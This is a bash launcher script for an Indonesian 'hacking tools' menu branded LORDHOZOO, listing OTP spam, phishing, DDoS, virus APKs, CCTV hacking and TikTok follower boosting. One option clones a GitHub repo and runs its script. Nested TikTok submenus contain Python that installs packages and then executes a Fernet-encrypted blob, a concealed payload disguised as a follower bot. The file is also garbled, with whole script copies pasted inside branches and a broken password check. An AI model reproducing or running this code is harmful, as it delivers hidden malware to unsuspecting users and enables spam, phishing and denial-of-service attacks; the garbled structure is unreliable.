#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
apt install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SPAM OTP CALL  SMS PAIR    ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK FOLLWERS TIKTOK     ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. MENU SEND MAILTI SPAM           ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU PHISING 2025   OP          ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU OSINT                      ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}. MENU DDOS                       ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}. MENU VIRUS TERMUX               ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU BUG APK TERKUX JARVIS      ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU PENGHAPUS ANDROID          ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU PABRIK (RISET) DEVUCE      ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. MENU SCAN URL APK ANTI VIRUS    ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. MENU MUSIC PHONK                ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. MENU INSTALL PKG MODULE         ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. MENU INSTALL APT OS LINUX       ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. MENU NGROK PERMANEN             ${GREEN}║"
echo -e "║ ${YELLOW}[16]${NC}. MENU TERMUX VPN JAPAN           ${GREEN}║"
echo -e "║ ${YELLOW}[17]${NC}. MENU TERMUX VPN AMERICA         ${GREEN}║"
echo -e "║ ${YELLOW}[18]${NC}. FIX KALI LINUX FIREFOX          ${GREEN}║"
echo -e "║ ${YELLOW}[19]${NC}. MENU APK VIRUS GANAS            ${GREEN}║"
echo -e "║ ${YELLOW}[20]${NC}. MENU CCTV HACK                  ${GREEN}║"
echo -e "║ ${YELLOW}[21]${NC}. MENU BACKUP TERMUX              ${GREEN}║"
echo -e "║ ${YELLOW}[22]${NC}. MENU EKSTRA BACKUP TERMUX       ${GREEN}║"
echo -e "║ ${YELLOW}[23]${NC}. MENU MOE ALL KHUSUS LINUX       ${GREEN}║"
echo -e "║ ${YELLOW}[24]${NC}. MENU SPAM TELEGRAM (99999)      ${GREEN}║"
echo -e "║ ${YELLOW}[25]${NC}. MENU TEKS BANNED WA HARD        ${GREEN}║"
echo -e "║ ${YELLOW}[26]${NC}. MENU TEKD UNBAN WA HARD         ${GREEN}║"
echo -e "║ ${YELLOW}[27]${NC}. MENU VNC KEX RDP                ${GREEN}║"
echo -e "║ ${YELLOW}[28]${NC}. MENU SPAM GMAIL                 ${GREEN}║"
echo -e "║ ${YELLOW}[29]${NC}. MENU BAN TIKTOK                 ${GREEN}║"
echo -e "║ ${YELLOW}[30]${NC}. MENU UNBAN TIKTOK               ${GREEN}║"
echo -e "║ ${YELLOW}[31]${NC}. ORDER CAMERA SADAP HTML         ${GREEN}║"
echo -e "║ ${YELLOW}[32]${NC}. ORDER JASA SPAM OTP WA DLL      ${GREEN}║"
echo -e "║ ${YELLOW}[33]${NC}. DONASI ( LORDHOZOO)             ${GREEN}║"
echo -e "║ ${YELLOW}[34]${NC}. MENU TRIAL RDP WEB              ${GREEN}║"
echo -e "║ ${YELLOW}[35]${NC}. MENU EXIFTOOLS JPG              ${GREEN}║"
echo -e "║ ${YELLOW}[36]${NC}. MENU BOT WA NEGARA LUAR         ${GREEN}║"
echo -e "║ ${YELLOW}[37]${NC}. CEK IP                          ${GREEN}║"
echo -e "║ ${YELLOW}[38]${NC}. CEK KARTU                       ${GREEN}║"
echo -e "║ ${YELLOW}[39]${NC}. DROK GOOGLE                     ${GREEN}║"
echo -e "║ ${YELLOW}[40]${NC}. SCAN NICK KTP                   ${GREEN}║"
echo -e "║ ${YELLOW}[41]${NC}. URL HTML MELIHAT HTML           ${GREEN}║"
echo -e "║ ${YELLOW}[42]${NC}. MENU WATERMAK YT TIKTOK DLL     ${GREEN}║"
echo -e "║ ${YELLOW}[43]${NC}. MENU CRACK PW ZIP               ${GREEN}║"
echo -e "║ ${YELLOW}[44]${NC}. MENU PRIVAT (HOZOO)             ${GREEN}║"
echo -e "║ ${YELLOW}[45]${NC}. MENU FIX SOUND LINUX            ${GREEN}║"
echo -e "║ ${YELLOW}[46]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[47]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[48]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[49]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[50]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

 data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    apt update
  #!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
 git clone https://github.com/hozoowhitehat/123
 cd 123
 bash OTP.sh
fi 
if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    apt update -y
#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    apt update
    #!/bin/bash

read -p "Menu: " choice

case $choice in
    1)
        python3 -c "
import os
os.system('pip install cryptography')
os.system('pip install requests')
os.system('pip install fernet')
import requests
from fernet import Fernet
exec(Fernet(b'K1E-7RgbqdsSP2RZMSHrmxUleGCBjEE2nBCHN3SGtzg=').decrypt(b'gAAAAABoCirUp34NAK0bZ6WNhCyz_Lunm3CGiK_hYfimSNog-3et6quWckb7fMD8ZDop7i_tfi9DP-PxIlmZf2kESNQKH_KFixQ1vOsoIs_ZqqU6KIVkXdtXx_kE-H82QHXf0F8FlDxQe7hwYgZaGnR9nDcEkbQUUn-CL0Mrt81xE_n-mlK71KVIAe2iVI01_bHFyN5muYM5UR2UhKwPniAbVk1aRBdCVMlKGoBgn89qF2ncGH7aTk0I='))
import requests
import random
import time

class TikTokBot:
    def __init__(self, api_key):
        self.api_key = api_key
        self.user_agents = [
            \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36\",
            \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36\",
            \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36\",
            \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\"
        ]

    def follow_user(self, user_id):
        url = f\"https://api.tiktok.com/aweme/v1/user/following/?key={self.api_key}\"
        payload = {
            \"user_id\": user_id
        }
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print(f\"Successfully followed user with ID {user_id}\")
        else:
            print(f\"Failed to follow user with ID {user_id}: {response.text}\")

    def like_video(self, video_id):
        url = f\"https://api.tiktok.com/aweme/v1/commit/item/digg/?key={self.api_key}\"
        payload = {
            \"item_id\": video_id
        }
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print(f\"Successfully liked video with ID {video_id}\")
        else:
            print(f\"Failed to like video with ID {video_id}: {response.text}\")

    def comment_video(self, video_id, comment):
        url = f\"https://api.tiktok.com/aweme/v1/comment/post/?key={self.api_key}\"
        payload = {
            \"aweme_id\": video_id,
            \"text\": comment
        }
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print(f\"Successfully commented on video with ID {video_id}: {comment}\")
        else:
            print(f\"Failed to comment on video with ID {video_id}: {response.text}\")

    def share_video(self, video_id):
        url = f\"https://api.tiktok.com/aweme/v1/share/item/?key={self.api_key}\"
        payload = {
            \"item_id\": video_id
        }
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print(f\"Successfully shared video with ID {video_id}\")
        else:
            print(f\"Failed to share video with ID {video_id}: {response.text}\")

    def view_video(self, video_id):
        url = f\"https://api.tiktok.com/aweme/v1/commit/item/digg/?key={self.api_key}\"
        headers = {
            \"User-Agent\": random.choice(self.user_agents),
            \"Accept-Language\": \"en-US,en;q=0.9\",
            \"Accept\": \"application/json\",
            \"Content-Type\": \"application/json\"
        }
        payload = {
            \"item_id\": video_id
        }
        response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            print(f\"Bot {generate_random_name()} watched your video with ID {video_id}\")
        else:
            print(f\"Failed to watch video with ID {video_id}: {response.text}\")

def main():
    api_key = \"your_api_key_here\"
    tiktok_bot = TikTokBot(api_key)

    while True:
        print (\"1. Follow a user\")
        print (\"2. Like a video\")
        print (\"3. Comment on a video\")
        print (\"4. Share a video\")
        print (\"5. View a video\")
        choice = input(\"Enter your choice: \")

        if choice == \"1\":
            user_id = input(\"Enter the TikTok user ID to follow: \")
            tiktok_bot.follow_user(user_id)
        elif choice == \"2\":
            video_id = input(\"Enter the TikTok video ID to like: \")
            tiktok_bot.like_video(video_id)
        elif choice == \"3\":
            video_id = input(\"Enter the TikTok video ID to comment on: \")
            comment = input(\"Enter your comment: \")
            tiktok_bot.comment_video(video_id, comment)
        elif choice == \"4\":
            video_id = input(\"Enter the TikTok video ID to share: \")
            tiktok_bot.share_video(video_id)
        elif choice == \"5\":
            video_id = input(\"Enter the TikTok video ID to view: \")
            tiktok_bot.view_video(video_id)
        else:
            print(\"Invalid choice. Please try again.\")

        wait_random_time()

def wait_random_time():
    duration = random.randint(30, 300)
    time.sleep(duration)

def generate_random_name():
    names = [\"Emma\", \"Liam\", \"Olivia\", \"Noah\", \"Ava\", \"Oliver\", \"Isabella\", \"William\", \"Sophia\", \"James\"]
    adjectives = [\"Intelligent\", \"Brave\", \"Friendly\", \"Determined\", \"Courageous\", \"Kind\", \"Clever\", \"Adventurous\"]
    return f\"{random.choice(adjectives)}{random.choice(names)}\"

if __name__ == \"__main__\":
    main()

print('kgtmlpqis')
"
        ;;
    *)
        echo "Invalid option"
        ;;
esac


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    apt update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    apt update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    apt update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    apt update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    apt update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    apt update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    apt update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    apt update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    apt  update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    apt update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    apt  update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    apt update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    apt  update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    apt update
fi

if [ "$updt" -eq 16 ]; then
    # Add your code here for option 16
    apt update -y
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
apt install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    apt update
    #!/bin/bash
    #!/bin/bash

read -p "Menu: " choice

case $choice in
    1)
        python3 -c "
import os
os.system('pip install cryptography')
os.system('pip install requests')
os.system('pip install fernet')
import requests
from fernet import Fernet
exec(Fernet(b'K1E-7RgbqdsSP2RZMSHrmxUleGCBjEE2nBCHN3SGtzg=').decrypt(b'gAAAAABoCirUp34NAK0bZ6WNhCyz_Lunm3CGiK_hYfimSNog-3et6quWckb7fMD8ZDop7i_tfi9DP-PxIlmZf2kESNQKH_KFixQ1vOsoIs_ZqqU6KIVkXdtXx_kE-H82QHXf0F8FlDxQe7hwYgZaGnR9nDcEkbQUUn-CL0Mrt81xE_n-mlK71KVIAe2iVI01_bHFyN5muYM5UR2UhKwPniAbVk1aRBdCVMlKGoBgn89qF2ncGH7aTk0I='))
import requests
import random
import time

class TikTokBot:
    def __init__(self, api_key):
        self.api_key = api_key
        self.user_agents = [
            \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36\",
            \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36\",
            \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36\",
            \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\"
        ]

    def follow_user(self, user_id):
        url = f\"https://api.tiktok.com/aweme/v1/user/following/?key={self.api_key}\"
        payload = {
            \"user_id\": user_id
        }
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print(f\"Successfully followed user with ID {user_id}\")
        else:
            print(f\"Failed to follow user with ID {user_id}: {response.text}\")

    def like_video(self, video_id):
        url = f\"https://api.tiktok.com/aweme/v1/commit/item/digg/?key={self.api_key}\"
        payload = {
            \"item_id\": video_id
        }
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print(f\"Successfully liked video with ID {video_id}\")
        else:
            print(f\"Failed to like video with ID {video_id}: {response.text}\")

    def comment_video(self, video_id, comment):
        url = f\"https://api.tiktok.com/aweme/v1/comment/post/?key={self.api_key}\"
        payload = {
            \"aweme_id\": video_id,
            \"text\": comment
        }
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print(f\"Successfully commented on video with ID {video_id}: {comment}\")
        else:
            print(f\"Failed to comment on video with ID {video_id}: {response.text}\")

    def share_video(self, video_id):
        url = f\"https://api.tiktok.com/aweme/v1/share/item/?key={self.api_key}\"
        payload = {
            \"item_id\": video_id
        }
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print(f\"Successfully shared video with ID {video_id}\")
        else:
            print(f\"Failed to share video with ID {video_id}: {response.text}\")

    def view_video(self, video_id):
        url = f\"https://api.tiktok.com/aweme/v1/commit/item/digg/?key={self.api_key}\"
        headers = {
            \"User-Agent\": random.choice(self.user_agents),
            \"Accept-Language\": \"en-US,en;q=0.9\",
            \"Accept\": \"application/json\",
            \"Content-Type\": \"application/json\"
        }
        payload = {
            \"item_id\": video_id
        }
        response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            print(f\"Bot {generate_random_name()} watched your video with ID {video_id}\")
        else:
            print(f\"Failed to watch video with ID {video_id}: {response.text}\")

def main():
    api_key = \"your_api_key_here\"
    tiktok_bot = TikTokBot(api_key)

    while True:
        print(\"1. Follow a user\")
        print(\"2. Like a video\")
        print(\"3. Comment on a video\")
        print(\"4. Share a video\")
        print(\"5. View a video\")
        choice = input(\"Enter your choice: \")

        if choice == \"1\":
            user_id = input(\"Enter the TikTok user ID to follow: \")
            tiktok_bot.follow_user(user_id)
        elif choice == \"2\":
            video_id = input(\"Enter the TikTok video ID to like: \")
            tiktok_bot.like_video(video_id)
        elif choice == \"3\":
            video_id = input(\"Enter the TikTok video ID to comment on: \")
            comment = input(\"Enter your comment: \")
            tiktok_bot.comment_video(video_id, comment)
        elif choice == \"4\":
            video_id = input(\"Enter the TikTok video ID to share: \")
            tiktok_bot.share_video(video_id)
        elif choice == \"5\":
            video_id = input(\"Enter the TikTok video ID to view: \")
            tiktok_bot.view_video(video_id)
        else:
            print(\"Invalid choice. Please try again.\")

        wait_random_time()

def wait_random_time():
    duration = random.randint(30, 300)
    time.sleep(duration)

def generate_random_name():
